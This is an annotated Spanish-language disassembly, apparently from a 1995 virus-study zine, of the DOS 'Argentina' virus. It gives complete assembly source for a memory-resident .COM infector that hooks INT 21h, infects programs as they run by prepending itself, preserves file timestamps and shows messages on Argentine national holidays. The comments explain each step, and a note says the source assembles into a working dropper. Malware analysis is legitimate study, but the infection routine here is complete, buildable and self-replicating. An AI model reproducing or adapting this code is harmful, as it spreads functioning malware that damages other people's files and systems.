; Virus Argentina.
; Desensamblado y Análisis Realizado Por Walt DiZnEy.
; Archivo Azul Nro. 001; 15/8/1995.


Segmento	segment	byte public
		assume	cs:Segmento, ds:Segmento


		org	100h

Start:


; **************************************************************************
; *************************** BLOQUE PRINCIPAL *****************************
; **************************************************************************


Argentina	Proc	Near

		; Saltamos Por Arriba De Una Zona De Datos, Buffers, Etc...

		jmp	short ComienzoDelVirus

		; ...Esos Datos...

		Nop

MarcaVirus	db	1Ah, 'Argentina Virus',0,'1.00'

SizeInP		dw	00h
OldInt21h	Dw	00,00h
OldInt24h	Dw	00,00h
HostCsIp	dw	00h
SaveAx		dw	00h
ViralSp		dw	00h
OrgFileDate	dw	00h
OrgFileTime	dw	00h

		; Bloque De Parámetros Para Ejecución De Archivo Huésped.
		; Pueden Encontrar Una Descripción Un Poco Más Completa En
		; Un Libro De DOS Como Los De Ray Duncan, Norton, Etc.
		; Nótese que en el puntero al bloque de entorno colocamos
		; cero, con lo cual el programa hijo (será el huésped)
		; obtiene una copia del bloque de entorno del programa
		; padre (el que lo ejecuta, o sea, el virus). 
		; Observemos también que a cada otro valor (línea de
		; comando, FCBs...) le pasamos los mismos del padre,
		; por lo que les damos el segmento del virus, y la 
		; ubicación de cada valor en el PSP del virus.

ParamBlock:
		Dw	 0000h	   ; Puntero De Segmento, Bloque De Entorno.

		Dw	 0080h 	   ; OffSet De Parámetros De Línea De Comando.
HereGoesCs1	dw	 0000h	   ; Segmento De Parámetros De Línea De Cmd.

		dw	 005Ch	   ; OffSet Del Primer FCB.
HereGoesCs2	dw	 0000h	   ; Segmento Del Primer FCB.

		dw	 006Ch     ; OffSet Del Segundo FCB.
HereGoesCs3	dw	 0000h     ; Segmento Del Segundo FCB.


		; Aquí Toma El Control El Virus.

ComienzoDelVirus:

		; Esta Es Una Forma Muy Interesante De Llamar Al Programa
		; Original. Si El Virus Está Instalado, Al Llamar A Esta
		; Función Con Esos Parámetros, Se Ejecutará El Programa
		; Original. 
		; Si El Virus No Esta Instalado, Normalmente, La Ejecución
		; Continuará.
		; Como Puede Verse, Se Le Pasan Ciertos Parámetros A La
		; Función; Eso Se Explicará Más Adelante.

		; Salvamos Ax.

		mov	SaveAx,ax

		; Llamamos A La Función Del Virus.

		mov	di,100h
		mov	si, OffSet EndVirus
		mov	cx,0FF00h
		sub	cx, OffSet EndVirus
		mov	ah,0FAh			; Definida Por El Virus.
		int	21h			

		; Obtenemos Ahora El Vector De La Interrupción 21h, Mediante
		; La Función 35h Del DOS.

		mov	ax,3521h
		int	21h			

		; Salvamos El Vector Original De La Int21h En OldInt21h.
						
		mov	OldInt21h,bx
		mov	word ptr OldInt21h+2,es

		; Hacemos Apuntar El Vector De La Int21h A La Porción Residente
		; Del Virus.

		mov	ax,2521h
		mov	dx,offset NewInt21h
		int	21h			

		; Cambiamos El Tamaño Del Bloque De Memoria.
		; Función 4Eh Del DOS. Es Contiene La Dirección De Segmento
		; Del Bloque A Modificar, y Bx El Tamaño Deseado En Párrafos.

		mov	ah,4Ah			

		; Cargamos En Bx El Tamaño Del Código Del Virus En Bytes
		; + 256 Bytes Para El PSP.

		mov	bx, OffSet EndVirus	

		; Llevamos El Stack Al Final Del Código Del Virus.

		mov	sp, OffSet EndVirus	; 'Salvamos' El Stack.
		push	ds			; Es <-- Ds.
		pop	es
		
		; Le Sumamos 15 A Bx, Para Redondear El Número.
		 
		add	bx,0Fh			

		; Convertimos A Párrafos.		

		shr	bx,1			
		shr	bx,1
		shr	bx,1
		shr	bx,1

		; Salvamos Esa Cantidad De Párrafos.

		mov	SizeInP,bx

		; Cambiamos El Tamaño Del Bloque De Memoria, y Liberamos
		; Toda La Memoria Que No Usábamos.

		int	21h			

		; Ahora Vamos A Ejecutar El Huésped Mediante La Función
		; 4Bh, Subfunción 00h Del DOS.

		; Primero, Preparamos El Bloque De Parámetros.		

		mov	HereGoesCs1,cs
		mov	HereGoesCs2,cs
		mov	HereGoesCs3,cs

		; Vamos a Buscar El Nombre Del Huésped En El Environment.
		; Hacemos Apuntar Es:Di Al Comienzo Del Bloque De Environment.

		mov	es, Word Ptr Ds:[02Ch]

		; Buscamos El Nombre Del Host En El Bloque De Environment.

		xor	di,di		; Di <-- 0
		xor	ax,ax		; Ax <-- 0
		mov	cx,0FFFFh	; Cx <-- 64Kb.
Bucle_1:
		repne	scasb
		cmp	byte ptr es:[di],0
		je	EjecutarHost
		scasb
		jnz	Bucle_1

		; Una Vez Hallado, Hacemos Apuntar Ds:Dx A Esa Cadena
		; AsciiZ (Según Lo Requerido Por Ah=4Bh). Es:Bx Apunta
		; Al Bloque De Parámetros Que Ya Habíamos Preparado.

EjecutarHost:
		mov	dx,di
		add	dx,3
		push	es			; Es <-- Ds.
		pop	ds
		mov	ax, 4B00h
		mov	bx, OffSet ParamBlock
		push	cs
		pop	es

		; Ejecutamos El Huésped.

		pushf
		call	dword ptr cs:OldInt21h

		; Obtenemos El Código De Retorno De La Ejecución Del Huésped
		; En Ax (Nos Interesa El Código De Retorno Emitido; Lo
		; Devolveremos Normalmente Cuando El Virus Devuelva El Control
		; Al DOS).

		mov	ah,4Dh
		int	21h			

		; Terminar y Quedar Residente!
		; En Al Va El Código De Retorno (Que Ya Obtuvimos), y En Bx
		; El Número De Párrafos A Dejar Residentes (Que Ya Habíamos
		; Salvado Antes).

		mov	ah,31h			
		mov	dx, Word Ptr [cs:SizeInP]
		int	21h			
						

		; La Rutina, a Continuación, Chequea La Fecha De Activación,
		; y Si Es Alguna Válida, Muestra Los Mensajes Correspondientes.
		; Luego Devuelve El Control A La Int21h Original, Se Haya
		; Mostrado Algún Mensaje O No.

SalidaVirus:
		; Ds <-- Cs. (Evidentemente, Porque Usaremos Ds:Dx Para
		; Apuntar A Los Mensajes, Dentro Del Código Vírico).

		push	cs
		pop	ds

		; Obtenemos La Fecha Mediante Función 2Ah Del DOS. 
		; Resultado: cx=Año, Dh=Mes, Dl=Día, Al=Día De La Semana.

		mov	ah,2Ah
		int	21h			

		; Verificamos Si Hoy Es Una Fecha Patria Argentina, y Si
		; Es Así, Mostramos El Mensaje Correspondiente a Ella.

		; ¿Es 25 De Mayo?

		cmp	dx,519h
		je	Es25DeMayo

		; ¿Es 20 De Junio?

		cmp	dx,614h
		je	Es20DeJunio

		; ¿Es 9 De Julio?

		cmp	dx,709h
		je	Es09DeJulio

		; ¿Es 17 De Agosto?

		cmp	dx,811h
		je	Es17DeAgosto

		; No Es Ninguna De Ellas. Salimos De Esta Rutina.

		jmp	short Salir
		Nop

Es25DeMayo:
		mov	dx, OffSet Msg_25
		jmp	short MostrarMensaje
		Nop
Es20DeJunio:
		mov	dx, OffSet Msg_20
		jmp	short MostrarMensaje
		Nop
Es09DeJulio:
		mov	dx, OffSet Msg_09
		jmp	short MostrarMensaje
		nop
Es17DeAgosto:
		mov	dx, OffSet Msg_17

MostrarMensaje:

		; Mostramos El Mensaje Correspondiente A La Fecha.

		mov	ah,9
		int	21h			

		; Mostramos El Mensaje 'Estándar' A Toda Activación.
		; (Nombre Del Virus, Etc).

		mov	dx,offset VirusMsg
		mov	ah,9
		int	21h			

		mov	dx,offset PressAKey
		mov	ah,9
		int	21h			

		; Esperamos La Pulsación De Una Tecla...
		; (Función 00h, Int16h: Esperar Entrada Por Teclado En Al).

		mov	ah,0
		int	16h			

		; Agregamos Un LineFeed Al Final Del Mensaje...

		mov	dx,offset LineFeed
		mov	ah,9
		int	21h			

		; Salimos De Esta Rutina...
Salir:
		; Restauramos El Stack Del Virus.

		mov	sp, Word Ptr [cs:ViralSp]

		; Restauramos Es, Ds, Di, Si, Dx, Cx, Bx, Ax.
		; (Importante Haber Restaurado Sp, Ya Que Estaban En La
		; Pila, Obviamente!)

		pop	es
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax

		; Restauramos El Ss:Sp Del Programa Original.

		mov	ss,cs:SaveSs
		mov	sp,cs:SaveSp

		; ...Y Llamamos A La Vieja Int21h.

		jmp	short Vieja21h
		Nop

		endp


; **************************************************************************
; **************************** PROCEDIMIENTOS ******************************
; **************************************************************************

; 1) NewInt21h	:  El Manejador De La Int21h Instalado Por El Virus.

NewInt21h	Proc	Near

		; ...Salvamos Los Flags En El Stack...

		pushf

		; Ahora Vemos Cuál De Los 'Servicios' De La Int21h Viral
		; Se Pidió... ;)

		; Ah = 0FAh : Ejecución Del Huésped.

		cmp	ah,0FAh
		je	YaResidente

		; Ah = 4B00h : Cargar y Ejecutar Programa. El Virus La
		;	       'Captura' Para Infectar Esos Programas Que
		;	       Se Ejecutan.

		cmp	ax,4B00h
		je	Infectar

		; Nada De Eso...Pasamos El Control A La Int21h Original.

Vieja21h:
		popf
		jmp	dword ptr cs:OldInt21h


		; El Virus Llama A Esta Función Propia (Normalmente El DOS
		; No La Usa) Para Ejecutar Al Huésped Cuando El Código 
		; Vírico Ya Está Instalado En Memoria.

YaResidente:
		; Sacamos Flags e Ip Del Stack. (Perdemos Ambos Valores,
		; Sólo Lo Hacemos Para 'Sacarlos De Ahí').

		pop	ax
		pop	ax

		; Ax <-- 100h.

		mov	ax,100h

		; Salvamos Ax=100h En Una Posición De Memoria A Tal Propósito.

		mov	cs:HostCsIp,ax

		; Sacamos Cs Del Stack.

		pop	ax

		; Salvamos Cs En A Continuación De Donde Guardamos Ip.
		; (De Esa Forma, Esa Posición De Memoria Apunta Al Comienzo
		; Del Host).

		mov	word ptr [cs:HostCsIp+2],ax

		; Ahora, Se 'Restaura' El Programa Original Para Su Ejecución.
		; Movemos Todo El .COM (Que Había Quedado 'Después' Del
		; Virus) Al Principio Del Bloque De Memoria). Recordemos Que
		; Llamábamos A Esta Función Con:	
		; Si= OffSet Del Final Del Virus; Comienzo Del Código
		;     Original.
		; Di= 100h (OffSet De Comienzo De Un Programa .COM, A Donde
		;     Moveremos Al Huésped Ahora).
		; Cx= Número De Bytes A Mover (Sera Todo Lo Que Quedó En El
		;     Bloque De Memoria, Después Del Virus)

		rep	movsb

		; Ax <-- 0 y A La Pila!

		xor	ax,ax
		push	ax

		; Restauramos El Valor De Ax Salvado.

		mov	ax, Word Ptr [Cs:SaveAx]

		; ...Y Saltamos Al Comienzo Del Huésped (Con Lo Cual 
		; Ejecutamos Normalmente Al Mismo y Listo! ;)).
		; (Notemos Que Lo Que Hace La Rutina Es Cargar Al Huésped
		; Al Principio Del Bloque, Como Lo Hubiera Hecho Si No
		; Estuviera El Virus Antes; Luego Lo Ejecuta Como Si Se
		; Hubiera Ejecutado Normalmente).

		jmp	dword ptr cs:HostCsIp

		; Acá Se Guardan Los Ss:Sp Originales.

SaveSp		dw	5FBh
SaveSs		dw	0E3Ch


		; Está Subrutina Realiza La Infección Del Archivo Ejecutado.

Infectar:
		; Salvamos Los Ss:Sp Originales En Posiciones De Memoria
		; A Tal Propósito. (O Sea, Salvamos La Localización Del
		; Stack).

		mov	cs:SaveSp,sp
		mov	cs:SaveSs,ss

		; Ahora Vamos A 'Crear' Un Stack Para El Virus, De Forma
		; Que Podamos Usarlo Sin Peligro. 

		; Ss <-- Cs. (O Sea, El Segmento Del Stack Será El Usado
		;	      Por El Código Del Virus).

		push	cs
		pop	ss

		; Sp <-- Sp. (O Sea, El Puntero Del Stack Estará 'Al Fondo'
		; 	      Del Cuerpo Del Virus, En Un Espacio A Tal
		; 	      Propósito).

		mov	sp,5E1h

		; 'Creado' Nuestro Stack, Podemos Salvar Todos Los Registros
		; Ahí Sin Peligro. 

		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	ds
		push	es

		; Guardamos La Localización Del Sp Del 'Stack Del Virus', Ya
		; Que Necesitaremos Saber Donde Está, Más Adelante.

		mov	cs:ViralSp,sp

		; ¿Cuál Es La Unidad De Disco Por Defecto?
		; (Resultado En Al: 0=A:, 1=B:, Etc...)
		; Usamos Función 019h Del DOS.

		mov	ah,19h
		int	21h			

		; Le Sumamos 41h (65 Decimal) Al Número Obtenido En Al.
		; De Esta Forma, Obtenemos En Al El Código Ascii De La
		; Unidad Por Defecto.
		; (Ej: 0 --> 'A' ; 1 --> 'B' ; Etc).

		add	al,41h			

		; Salvamos Esa Información En Una Posición A Tal Propósito.
		; (Comienzo De La Cadena AsciiZ Con El Nombre Del Programa
		; A Infectar).

		mov	Byte Ptr [Cs:HostString], al

		; También Lo Salvamos Como Drive Del Archivo Auxiliar.
		; (Veremos Esto Más Adelante).

		mov	byte ptr [Cs:AuxFile],al

		; A Continuación, 'Armamos' El Path y Nombre Del Archivo
		; A Infectar.

		; Di <-- Lugar A Guardar Path y Nombre.

		mov	di,offset Path&Name

		; Salvamos En La Pila.

		push	di

		; Si <-- Lugar Donde Están El Path y Nombre Completos. 
		;	 (4B00h Los Requiere En Ds:Dx).

		mov	si,dx

		; El Path En Dx...¿Incluye El Drive?. Si Lo Incluye, Lo
		; Tomamos De Ahí. Si No Lo Incluye, Tomamos El Drive Por
		; Defecto Que Ya Habíamos Salvado.

		cmp	byte ptr [si+1], ':'
		jne	CopiarPath

		; Sí; Entonces Tomémoslo De Ahí Directamente, y Guardémoslo
		; Donde Habíamos Guardado El Drive Por Defecto Para El
		; Huésped. Hacemos Lo Mismo Para El Drive Del Archivo
		; Auxiliar.

		mov	al,[si]
		mov	Byte Ptr [cs:HostString],al	; Huésped.
		mov	byte ptr [Cs:AuxFile],al	; Auxiliar.

		; Le Sumamos 2 A Si; Entonces, Si Apunta Directamente Al
		; Path Del Archivo, Sin Incluir Drive.

		add	si,2

		; Copiamos El Path y Nombre De Archivo A La Posición
		; Destinada A Ese Fin.
CopiarPath:
		; Es <-- Cs.
		push	cs
		pop	es

		; Copiamos 63 Bytes...

		mov	cx,3Fh

BucleCopia:
		; Al <-- [Si]

		lodsb

		; Aparentemente, Intenta Transformar Las Minúsculas a
		; Mayúsculas, Pero Lo Hace Incorrectamente.

		cmp	al,61h			; Anterior A 'a'?
		jb	RepiteBucle
		cmp	al,7Ah			; Entre 'a' y 'z'?
		ja	RepiteBucle
		add	al,0E0h
RepiteBucle:
		; Copia El Caracter, y Sigue Con El Bucle.

		stosb
		loop	BucleCopia

		; Recuperamos Di. (Apunta Al Comienzo De La Cadena De Path
		; y Nombre).

		pop	di

		; Cs <-- Ds.

		push	cs
		pop	ds

		; Buscamos Un '.' En La Cadena AsciiZ. (Estamos Buscando
		; La Localización De La Extensión, Para Determinar Si Es
		; Un .COM o No).

		mov	cx,40h
		mov	al,'.'
		repne	scasb

		; La Hallamos. Veamos Ahora Si Es Un '.COM', Comparándola
		; Con Una Cadena A Tal Propósito.

		mov	cx,3
		mov	si,(offset CommandStr+7)
		repe	cmpsb

		; Si Es Un '.COM'...

		jz	HallamosCOM

		; No Es Un '.COM', Retornamos.

		jmp	SalidaVirus

		; Va A Restaura&Sale. (Este Está Aquí Por El Típico
		; Relative Jump Out Of Range).

Restaurar&Salir:

		jmp	Restaura&Sale

		; Sabemos Que Es Un '.COM'; Pasamos a Partes Más Específicas
		; De La Infección.
HallamosCOM:
		; ¿Es El Command.Com?
		; (Comparamos El String En Di Con Un String Que Tiene El
		;  Virus A Tal Propósito).

		sub	di,0Bh
		mov	cx,7			; 7 Bytes...
		mov	si,offset CommandStr	; String 'Command'
		repe	cmpsb

		; No Es El Command.Com, Sigamos Viendo Si Podemos Infectar.

		jnz	Continuamos

		; Es El Command.Com, No Lo Infectamos. Retornamos.

		jmp	SalidaVirus
Continuamos:
		; Instalamos Un Manejador Para La Int24h, 'Critical Error
		; Handler'.

		mov	ax,3524h
		int	21h			

		; Salvamos Viejo Vector.

		mov	Word Ptr cs:[OldInt24h],bx
		mov	Word Ptr cs:[OldInt24h+2],es

		; Seteamos Nuevo Vector.

		mov	ax,2524h
		push	cs
		pop	ds
		mov	dx,offset NewInt24h
		int	21h			

		; Comienza La Parte Específica De La Infección.

		; Abrimos El Archivo Cuyo Drive/Nombre/Path Ya Guardamos
		; En El OffSet HostString.
		; (Abrimos Para Lectura: Al=00h).

		mov	dx,offset HostString
		mov	ax,3D00h
		int	21h			

		; Pasamos El Handle A Bx.

		mov	bx,ax

		; Leemos 09h Bytes Del Archivo, En Un Buffer.

		mov	dx,offset Buffer
		mov	cx,9
		mov	ah,3Fh
		int	21h			

		; Si Hubo Algún Error, Restauramos La Vieja Int24h, y
		; Retornamos.

		jc	Restaurar&Salir

		; Obtenemos La Fecha y Hora Del Archivo, y Los Salvamos.
		; (Función 57h Del DOS; Retorna: Cx=Hora, Dx=Fecha).

		mov	ax,5700h
		int	21h			

		mov	OrgFileDate,dx
		mov	OrgFileTime,cx

		; Cerramos El Archivo.

		mov	ah,3Eh
		int	21h			

		; ¿Está Infectado? : Buscamos La 'Marca' Del Virus.

		mov	ax, Word Ptr [Buffer+3]
		cmp	ax, Word Ptr [MarcaVirus]

		; Sí; Retornamos.

		je	Restaurar&Salir

		; No Está Infectado; Pasamos a Infectar.

		; Creamos Un Archivo Auxiliar.
		; (Función 3Ch Del DOS).

		mov	dx,offset AuxFile
		mov	ah,3Ch			
		xor	cx,cx			; Atributos = 0.
		int	21h			

		; Si No Pudimos, Retornamos.

		jc	Restaurar&Salir

		; Pasamos El Handle A Bx.

		mov	bx,ax

		; Escribimos El Código Del Virus En Ese Archivo Auxiliar.
		; (Función 40h Del DOS; Requiere: Bx=Handle; Cx=Nro. Bytes,
		;  Dx=Buffer A Escribir).

		mov	dx,100h
		mov	cx,4E1h
		mov	ah,40h
		int	21h			

		; Si Hubo Algún Error, Retornamos.

		cmp	ax,cx
		jne	Restaurar&Salir

		; Salvamos El Handle Del Archivo Auxiliar.

		mov	SaveHandle,bx

		; Ahora Abrimos El Huésped Para Lectura.
		; (Función 3Dh Del DOS, Etc...)

		mov	dx,offset HostString
		mov	ax,3D00h
		int	21h			

		; Si No Pudimos, Retornamos.

		jc	Restaurar&Salir_2

		; Pasamos El Handle A Bx.

		mov	bx,ax

		; Salvamos El Handle En El Stack.

		push	bx

		; Reservamos Memoria Para Un Buffer Auxiliar. (Ya Que
		; Copiaremos Todo El Huésped A Continuación Del Virus, En
		; El Archivo Auxiliar).
		; (Usamos La Función 48h Del DOS; Requiere: Bx=Párrafos
		; A Reservar; Retorna: Ax:0000=Comienzo De La Memoria
		; Otorgada).

		mov	bx,500h		; 500h Párrafos --> 20Kb
		mov	ah,48h
		int	21h			

		; Recuperamos Handle.

		pop	bx

		; Dx <-- 00; Ds <-- Ax. Con Esto, Ds:Dx Apunta Al Comienzo
		; De La Memoria Asignada).

		xor	dx,dx
		mov	ds,ax
CopiaArchivo:
		; Leemos 20Kb Del Huésped Al Buffer En Ds:Dx. (El Que
		; Recién Asignamos).

		mov	cx,5000h
		mov	ah,3Fh
		int	21h			

		; Si No Pudimos, Retornamos.

		jc	Restaurar&Salir_2

		; ¿Ya Terminó El Archivo Huésped? (La Función 3Dh Devuelve
		; 00h En Ax Si Se Intentó Leer Desde El 'Fin' Del Archivo).

		cmp	ax,0

		; Sí; El 'Bloque' Del Huésped Que Cargamos En Memoria Es
		; El Ultimo Del Archivo (O Bien El Ultimo).

		je	FinCopia

		; Copiamos El Contenido Del Buffer Al Archivo Auxiliar.
		; (Nótese Que Intercambiamos El Handle Del Huésped Con El
		; Handle Del Auxiliar).

		mov	cx,ax			; Bytes En Cx.
		xchg	cs:SaveHandle,bx
		mov	ah,40h			; Escribimos...
		int	21h			

		; Si Hubo Error, Retornamos.

		cmp	ax,cx
		jne	Restaurar&Salir_2

		; Volvemos A Intercambiar Los Handles, Con Lo Cual, Tenemos
		; En Bx El Handle Del Huésped.

		xchg	cs:SaveHandle,bx

		; Seguimos Con El Proceso, Hasta Copiar Todo El Huésped
		; Al Auxiliar.

		jmp	short CopiaArchivo


		; Este 'Restaurar&Salir_2' Es Análogo Al Anterior; Está
		; Aquí Por El Famoso $#%@! 'Relative Jump Out Of Range'.

Restaurar&Salir_2:

		jmp	short Restaura&Sale
		Nop

		; Ya Terminamos De Copiar El Virus y El Huésped Al Auxiliar.
		; (Nótese Que En El Auxiliar Quedó Primero El Virus, y
		; Luego El Huésped).
FinCopia:
		; Liberamos La Memoria Que Habíamos Reservado Para El Buffer
		; De Copiado.
		; (Utilizamos Función 49h Del DOS; Requiere: Es=Segmento De
		; Comienzo Del Bloque De Memoria A Liberar).
		; (Nótese Que Pasamos Ds A Es, Ya Que Habíamos Pasado El
		; Comienzo Del Bloque A Ds, Anteriormente).

		push	ds			
		pop	es			; Es <-- Ds.
		mov	ah,49h			; Liberamos!
		int	21h			

		; Es <-- Cs.
		; Ds <-- Cs.

		push	cs
		push	cs
		pop	es
		pop	ds

		; Cerramos El Archivo Huésped.

		mov	ah,3Eh
		int	21h			

		; Si No Pudimos, Retornamos.

		jc	Restaurar&Salir_2

		; Recuperamos El Handle Del Auxiliar.

		mov	bx,SaveHandle

		; Le Colocamos Al Auxiliar La Fecha y Hora Originales Del
		; Huésped.
		; (Usamos Función 57h, Subfunción 01h: Establecer La Fecha			; y Hora De Un Archivo).

		mov	ax,5701h
		mov	dx,OrgFileDate		; Fecha
		mov	cx,OrgFileTime		; Hora
		int	21h			

		; Cerramos El Archivo Auxiliar.
		
		mov	ah,3Eh
		int	21h			

		; Si No Pudimos, Retornamos.
		
		jc	Restaurar&Salir_2

		; Le 'Borramos' Todos Los Atributos Al Huésped.
		; (Función 43h, Subf. 01h: Colocar A Un Archivo (En Dx)
		; Los Atributos En Cx).

		xor	cx,cx
		mov	dx,offset HostString
		mov	ax,4301h
		int	21h			

		; Borramos El Archivo Huésped.

		mov	ah,41h
		int	21h			

		; Renombramos El Archivo Auxiliar Con El Nombre Del Huésped.
		; (Función 56h Del DOS: Renombrar Archivo En Ds:Dx Con El
		;  Nombre En Es:Di).

		mov	dx,offset AuxFile
		mov	di,offset HostString
		mov	ah,56h
		int	21h			

		; Finalizada La Infección, Retornamos.

		jmp	short Restaura&Sale
		Nop

		endp


; 2) NewInt24h  :  Manejador De Errores Críticos Instalado Por El Virus.

NewInt24h	proc	Near

		; Retornar 0 En Al --> 'Sin Error'.
		xor	al,al

		; Retorno De Interrupción.

		iret
		endp


		; Esta Rutina A Continuación, Restaura El Viejo Manejador
		; De Errores Críticos (O Sea, Restaura La Vieja Int24h), y
		; Luego Va Al 'Proceso De Salida' Del Virus.

Restaura&Sale:
		mov	dx,cs:OldInt24h		; Recuperamos El Viejo Vector.
		mov	ds,cs:[OldInt24h+2]
		mov	ax,2524h		; Setear Vector...
		int	21h			

		; Salida Del Virus (Chequeo De Activación y Salida En Sí).

		jmp	SalidaVirus


; **************************************************************************
; ************************* DATOS, BUFFERS, ETC ****************************
; **************************************************************************

		; Cadena Donde Se Guarda El Nombre Del Huésped.

HostString	Db	00h		; Aquí Irá El Drive...
		Db	':'
Path&Name	Db	05Eh dup (0)

		; Cadena Para Chequeo De 'Command.Com'.

CommandStr	Db	'COMMANDCOM'

		; Drive y Nombre Del Archivo Auxiliar.

AuxFile		Db	00h			; Aquí Irá El Drive...
		Db	':'
		Db	'MOM.MOM', 0		; Nombre...

		; Todos Los Mensajes De Las Fechas De Activación...
	
Msg_25:		db	'25 de Mayo Declaración '
		db	'de la independencia Argentina', 0Ah
		db	0Dh, '$'

Msg_20:		db	'20 de Junio Dia de la bandera Ar'
		db	'gentina', 0Ah, 0Dh, '$'

Msg_09:		db	'9 de Julio Dia de la independenc'
		db	'ia Argentina', 0Ah, 0Dh, '$'

Msg_17		db	'17 de Agosto Aniversario de la d'
		db	'efunción del Gral. San Martin', 0Ah
		db	0Dh, '$'

VirusMsg	Db	'Argentina Virus escrito por AfA '
		db	'- Virus benigno - ENET 35', 0Ah, 0Dh
		db	'$'

PressAKey	Db	'Pulse una tecla para continuar..'
		db	'.$'

LineFeed	db	0Ah, 0Dh, '$'

		; Buffer De 9 Bytes; Se Usa Para Chequear La Infección.

Buffer		db	09h Dup(0)

		; Aquí Salvamos El Handle De Turno. ;)

SaveHandle	dw	00h

		; El Espacio A Continuación Es Utilizado Por El Virus
		; Como Stack.

		Db	052h Dup(0)
EndVirus:

		; 'Huésped Auxiliar'. Lo Necesitamos Para Obtener Un
		; 'Dropper' Funcional Del Virus Al Ensamblarlo.

		Int	20h

Segmento	ends



		end	start

